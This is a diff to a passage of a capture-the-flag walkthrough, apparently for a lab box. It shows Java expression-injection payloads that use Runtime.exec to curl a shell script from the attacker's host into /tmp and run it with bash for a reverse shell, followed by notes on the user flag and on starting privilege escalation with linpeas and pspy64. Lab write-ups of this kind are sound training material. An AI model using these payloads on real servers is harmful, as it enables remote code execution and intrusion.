@@ -48,23 +48,23 @@ python -m http.server 8000
 Then upload your shell script....
 
 ```
-*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl YOUR_IP:8000/shell.sh --output /tmp/test.sh ")}
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl YOUR_IP:8000/shell.sh --output /tmp/shell.sh ")}
 ```
-Getting our reverse shell...
+**Getting our reverse shell...**
 <br> Make sure to set your listener.... 
 ```
 *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("bash /tmp/shell.sh")}
 ```
 and boom! 
+![Screenshot_2022-11-20_15_47_26](https://user-images.githubusercontent.com/99975622/205457657-02e0bff9-1d54-490b-8cb6-d52aba8d8aa1.png)
 
-
-
-Getting user flag....
-
-
+**Getting user flag....**
+<br>Navigate to the home directory and get your user flag!
+![Screenshot_2022-11-20_15_49_02](https://user-images.githubusercontent.com/99975622/205457694-762cf23e-949e-4f26-9b6f-624854c03d3e.png)
 
 ### Priviledge Escalation...
-
-
+**Running linpeas...**
+![Screenshot_2022-11-20_16_09_37](https://user-images.githubusercontent.com/99975622/205457719-dd406a39-31dc-492b-8e22-9f4f7cce0718.png)
+Linpeas didn't really give us any useful information so i moved on to pspy64 to check if there are any activities running in the background....
 
 
